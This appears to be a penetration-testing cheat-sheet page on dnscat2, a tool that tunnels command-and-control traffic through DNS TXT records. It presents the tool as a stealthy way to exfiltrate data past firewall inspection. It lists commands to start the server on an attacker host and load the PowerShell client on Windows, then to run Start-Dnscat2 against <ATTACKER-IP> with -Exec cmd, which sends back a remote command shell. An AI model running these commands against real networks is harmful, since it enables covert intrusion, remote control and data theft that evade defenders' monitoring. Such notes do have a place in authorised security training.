---
tags:
  - firewall-evasion
  - dns
---
[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.

Usually, every AD domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with `dnscat2`, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.
# Example Usage
1. Start DNScat2 server on attack host:
```shell-session
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/
$ gem install bundler
$ bundle install

$ sudo ruby dnscat2.rb --dns host=<ATTACKER-IP>,port=53,domain=inlanefreight.local --no-cache
... SNIP ...
... POST CONNECTION in (3) ...

New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```
This will provide us a `--secret=<KEY>` , which we will have to provide to our `dnscat2` client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.
2. [[File Transfer|Transfer]] `dnscat2` project or [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) based client to Windows:
```powershell
PS > Import-Module .\dnscat2.ps1
```
3. Establish a tunnel to our server, and send back a CMD shell:
```powershell
PS > Start-Dnscat2 -DNSserver <ATTACKER-IP> -Domain inlanefreight.local -PreSharedSecret <KEY> -Exec cmd
```
# Useful Commands
- `?`
- `<COMMAND> -h`